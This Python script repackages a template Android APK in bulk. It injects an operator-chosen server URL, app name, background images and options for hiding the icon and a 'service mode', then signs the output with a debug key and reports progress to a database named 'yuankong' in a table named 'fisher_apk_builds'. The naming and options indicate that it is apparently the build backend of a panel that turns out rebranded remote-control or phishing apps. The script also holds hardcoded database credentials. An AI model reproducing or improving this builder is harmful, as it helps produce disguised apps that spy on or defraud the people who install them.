#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""tf_build.py - 面板打包器（模板 = 1 的 APK  com.zq.final 7.4.9）

用法:  python tf_build.py --job <job.json>
job.json: {record_id, template, out, server_url, web_url, app_name,
           page_style_config, background_b, icon, show_app_icon, enable_service_mode}
"""
import argparse, json, os, struct, subprocess, sys, time, zipfile

BASE = os.path.dirname(os.path.abspath(__file__))
SDK = os.environ.get("ANDROID_SDK_ROOT") or r"C:\Users\Administrator\AppData\Local\Android\Sdk"
BT = os.path.join(SDK, "build-tools", "35.0.0")
ZIPALIGN = os.path.join(BT, "zipalign.exe")
APKSIGNER = os.path.join(BT, "apksigner.bat")
KEYTOOL = r"C:\Program Files\Eclipse Adoptium\jdk-8.0.472.8-hotspot\bin\keytool.exe"
MYSQL = r"C:\Program Files\MariaDB 12.3\bin\mysql.exe"
KS = os.path.join(BASE, "_debug.keystore")
KSPASS = "android"
KSALIAS = "debugkey"

LOG = []


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    LOG.append(line)
    print(line, flush=True)


def sql_escape(s):
    return str(s).replace("\\", "\\\\").replace("'", "''")


def db(sql):
    try:
        subprocess.run([MYSQL, "--default-character-set=utf8mb4", "-u", "yuankong",
                        "-pyuankong", "yuankong", "-e", sql],
                       capture_output=True, text=True, timeout=30)
    except Exception as exc:
        log("db warn: %s" % exc)


def set_state(bid, **kv):
    if not bid:
        return
    kv["build_log"] = "\n".join(LOG[-40:])
    cols = []
    for k, v in kv.items():
        if v is None:
            continue
        if isinstance(v, int):
            cols.append("%s=%d" % (k, v))
        else:
            cols.append("%s='%s'" % (k, sql_escape(v)))
    db("UPDATE fisher_apk_builds SET " + ",".join(cols) + " WHERE id=%d" % int(bid))


# ---------------------------------------------------------------- AXML label
def _enc_len8(n):
    """AXML UTF-8 变长长度（1-2 字节，高位标记）"""
    if n > 0x7f:
        return bytes([0x80 | ((n >> 8) & 0x7f), n & 0xff])
    return bytes([n])


def _axml_pool(data):
    pool = 8
    pt, phsz, psize, sc, stc, flags, sstart, stylestart = struct.unpack_from('<HHIIIIII', data, pool)
    if pt != 0x0001:
        return None
    return dict(pool=pool, hsz=phsz, size=psize, count=sc, style_count=stc,
                flags=flags, sstart=sstart, stylestart=stylestart,
                utf8=bool(flags & 0x100))


def _axml_strings(data, pi):
    pool, hsz, sc, sstart = pi['pool'], pi['hsz'], pi['count'], pi['sstart']
    offs = [struct.unpack_from('<I', data, pool + hsz + i * 4)[0] for i in range(sc)]
    out = []
    for o in offs:
        pos = pool + sstart + o
        if pi['utf8']:
            n = data[pos]; pos += 1
            if n & 0x80:
                n = ((n & 0x7f) << 8) | data[pos]; pos += 1
            bl = data[pos]; pos += 1
            if bl & 0x80:
                bl = ((bl & 0x7f) << 8) | data[pos]; pos += 1
            out.append(('u8', pos, n, bl))
        else:
            n = struct.unpack_from('<H', data, pos)[0]; pos += 2
            if n & 0x8000:
                n = ((n & 0x7fff) << 16) | struct.unpack_from('<H', data, pos)[0]; pos += 4
            out.append(('u16', pos, n, n * 2))
    return offs, out


def _axml_get(data, pi, offs, rec, i):
    kind, pos, n, bl = rec[i]
    if kind == 'u8':
        return data[pos:pos + bl].decode('utf-8', 'replace')
    return data[pos:pos + n * 2].decode('utf-16-le', 'replace')


def _iter_elements(data, pool_end):
    pos = pool_end
    while pos + 8 <= len(data):
        ct, chsz, csize = struct.unpack_from('<HHI', data, pos)
        if csize == 0:
            break
        if ct == 0x0102:
            yield pos
        pos += csize


def axml_patch_label(data, new_label):
    """把 <application android:label> 改成内联字符串 new_label。返回 (新bytes, 说明)"""
    pi = _axml_pool(data)
    if not pi:
        return None, "no pool"
    if pi['style_count']:
        return None, "styleCount!=0 (跳过)"
    offs, rec = _axml_strings(data, pi)
    names = [_axml_get(data, pi, offs, rec, i) for i in range(pi['count'])]
    idx_app = names.index('application') if 'application' in names else -1
    idx_label = names.index('label') if 'label' in names else -1
    idx_ns = -1
    for i, s in enumerate(names):
        if s == 'http://schemas.android.com/apk/res/android':
            idx_ns = i
            break
    if idx_app < 0 or idx_label < 0:
        return None, "application/label string missing"

    old_pool_end = pi['pool'] + pi['size']
    target = None
    for pos in _iter_elements(data, old_pool_end):
        ns, nm = struct.unpack_from('<II', data, pos + 16)
        if nm != idx_app:
            continue
        a_start, a_size, a_count = struct.unpack_from('<HHH', data, pos + 24)
        for k in range(a_count):
            ap = pos + 16 + a_start + k * a_size
            ans, an, araw = struct.unpack_from('<III', data, ap)
            if an != idx_label:
                continue
            dsz, res0, dt, dv = struct.unpack_from('<HBBI', data, ap + 12)
            target = (ap, ap + 12, ans, dt, dv)
            break
        break
    if not target:
        return None, "<application android:label> not found"

    # --- 1) 重建 string pool（追加新字符串） ---
    old_data_start = pi['pool'] + pi['sstart']
    old_data = bytearray(data[old_data_start:old_pool_end])
    if pi['utf8']:
        b = new_label.encode('utf-8')
        seg = bytearray(_enc_len8(len(b))) + bytearray(_enc_len8(len(b))) + b + b'\x00'
    else:
        n = len(new_label)
        if n > 0x7fff:
            return None, "label too long"
        seg = bytearray(struct.pack('<H', n)) + new_label.encode('utf-16-le') + b'\x00\x00'
    new_off = len(old_data)
    while new_off % 4:
        old_data.append(0)
        new_off = len(old_data)
    old_data += seg
    while len(old_data) % 4:
        old_data.append(0)

    new_count = pi['count'] + 1
    new_sstart = pi['hsz'] + 4 * new_count
    new_psize = new_sstart + len(old_data)
    new_index = pi['count']

    pool_bytes = bytearray()
    pool_bytes += struct.pack('<HHIIIIII', 0x0001, pi['hsz'], new_psize,
                              new_count, 0, pi['flags'], new_sstart, 0)
    for o in offs:
        pool_bytes += struct.pack('<I', o)
    pool_bytes += struct.pack('<I', new_off)
    pool_bytes += bytes(old_data)

    root_type, root_hsz, root_size = struct.unpack_from('<HHI', data, 0)
    new_size = root_size + (new_psize - pi['size'])
    out = bytearray()
    out += struct.pack('<HHI', root_type, root_hsz, new_size)
    out += bytes(pool_bytes)
    out += data[old_pool_end:]

    # --- 2) 定位（偏移平移后）并写入 ---
    shift = new_psize - pi['size']
    ap_old, tv_old = target[0], target[1]
    ap = ap_old + shift
    tv = ap + 12
    struct.pack_into('<I', out, ap + 8, new_index)          # rawValue
    struct.pack_into('<HBBI', out, tv, 8, 0, 0x03, new_index)  # typedValue: STRING
    return bytes(out), "label=%s (idx %d)" % (new_label, new_index)


# ------------------------------------------------------------------ repack
def build(job):
    bid = job.get('record_id')
    tpl = job.get('template') or os.path.join(BASE, 'source.apk')
    out = job['out']
    server_url = (job.get('server_url') or '').strip()
    set_state(bid, status='building', progress=5, message='读取模板', error='')
    log('模板: %s' % tpl)
    if not os.path.isfile(tpl):
        raise RuntimeError('模板不存在: %s' % tpl)

    zin = zipfile.ZipFile(tpl, 'r')
    old_cfg = {}
    try:
        old_cfg = json.loads(zin.read('assets/server_config.json').decode('utf-8'))
    except Exception as exc:
        log('模板 server_config.json 读取失败(将新建): %s' % exc)

    new_cfg = dict(old_cfg)
    if server_url:
        new_cfg['serverUrl'] = server_url
        new_cfg['serverAddr'] = server_url
    if job.get('web_url'):
        new_cfg['webUrl'] = job['web_url']
    psc = job.get('page_style_config') or {}
    name = (job.get('app_name') or '').strip()
    if name:
        new_cfg['appName'] = name
    if psc:
        new_cfg['pageStyleConfig'] = psc
    new_cfg['showAppIcon'] = bool(job.get('show_app_icon', True))
    new_cfg['enableServiceMode'] = bool(job.get('enable_service_mode', False))
    cfg_bytes = json.dumps(new_cfg, ensure_ascii=False, separators=(',', ':')).encode('utf-8')
    set_state(bid, progress=18, message='注入 server_config.json')
    log('server_config.json -> %d bytes, serverUrl=%s' % (len(cfg_bytes), new_cfg.get('serverUrl')))
    log('  deviceKeySalt 保留: %s' % str(old_cfg.get('deviceKeySalt'))[:16])

    # ---- 背景图 ----
    bg_bytes = None
    if job.get('background_b') and os.path.isfile(job['background_b']):
        with open(job['background_b'], 'rb') as f:
            bg_bytes = f.read()
        log('替换加载背景 %d bytes' % len(bg_bytes))

    # ---- AndroidManifest label ----
    set_state(bid, progress=30, message='改写应用名')
    am_new = None
    if name:
        try:
            am_old = zin.read('AndroidManifest.xml')
            am_new, why = axml_patch_label(am_old, name)
            log('manifest label: %s' % (why if am_new else ('SKIP ' + why)))
        except Exception as exc:
            log('manifest label 异常: %s' % exc)
            am_new = None

    set_state(bid, progress=45, message='重打包')
    os.makedirs(os.path.dirname(out), exist_ok=True)
    if os.path.exists(out):
        os.remove(out)
    written = 0
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as zout:
        for info in zin.infolist():
            fn = info.filename
            if fn.upper().startswith('META-INF/'):
                continue
            data = zin.read(fn)
            if fn == 'assets/server_config.json':
                data = cfg_bytes
            elif fn == 'AndroidManifest.xml' and am_new is not None:
                data = am_new
            elif bg_bytes is not None and fn in ('assets/app_loading_bg.png', 'assets/bg_accessibility.png'):
                data = bg_bytes
            ni = zipfile.ZipInfo(fn, date_time=info.date_time)
            if fn == 'resources.arsc' or info.compress_type == zipfile.ZIP_STORED:
                ni.compress_type = zipfile.ZIP_STORED
            else:
                ni.compress_type = zipfile.ZIP_DEFLATED
            ni.external_attr = info.external_attr
            ni.flag_bits &= ~0x01
            zout.writestr(ni, data)
            written += 1
    zin.close()
    log('重打包完成: %d entries, %d bytes' % (written, os.path.getsize(out)))

    # ---- zipalign ----
    set_state(bid, progress=62, message='zipalign')
    aligned = out + '.aligned'
    if os.path.exists(aligned):
        os.remove(aligned)
    r = subprocess.run([ZIPALIGN, '-f', '-p', '4', out, aligned], capture_output=True, text=True)
    log('zipalign rc=%d %s' % (r.returncode, (r.stdout or r.stderr or '').strip()[:200]))
    if r.returncode != 0 or not os.path.exists(aligned):
        raise RuntimeError('zipalign 失败')
    os.replace(aligned, out)

    # ---- 签名 ----
    set_state(bid, progress=80, message='签名')
    if not os.path.isfile(KS):
        subprocess.run([KEYTOOL, '-genkeypair', '-keystore', KS, '-alias', KSALIAS,
                        '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000',
                        '-storepass', KSPASS, '-keypass', KSPASS,
                        '-dname', 'CN=Android Debug,O=Android,C=US'], capture_output=True, text=True)
    r = subprocess.run([APKSIGNER, 'sign', '--ks', KS, '--ks-pass', 'pass:' + KSPASS,
                        '--ks-key-alias', KSALIAS, '--key-pass', 'pass:' + KSPASS,
                        '--v1-signing-enabled', 'true', '--v2-signing-enabled', 'true',
                        '--v3-signing-enabled', 'true', out], capture_output=True, text=True)
    log('apksigner sign rc=%d %s' % (r.returncode, (r.stdout or r.stderr or '').strip()[:300]))
    if r.returncode != 0:
        raise RuntimeError('apksigner 签名失败')

    set_state(bid, progress=93, message='校验签名')
    r = subprocess.run([APKSIGNER, 'verify', '--print-certs', out], capture_output=True, text=True)
    ok = (r.returncode == 0)
    log('apksigner verify: %s' % ('OK' if ok else (r.stdout or r.stderr or '').strip()[:200]))

    size = os.path.getsize(out)
    set_state(bid, status='done' if ok else 'failed', progress=100,
              message='构建完成 %d bytes' % size, file_size=size, out_path=out,
              error='' if ok else 'signature verify failed')
    log('输出: %s (%d bytes)' % (out, size))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--job', required=True)
    a = ap.parse_args()
    with open(a.job, 'r', encoding='utf-8-sig') as f:
        job = json.load(f)
    bid = job.get('record_id')
    try:
        build(job)
    except Exception as exc:
        log('FAILED: %s' % exc)
        set_state(bid, status='failed', progress=0, message='构建失败', error=str(exc))
        sys.exit(1)


if __name__ == '__main__':
    main()
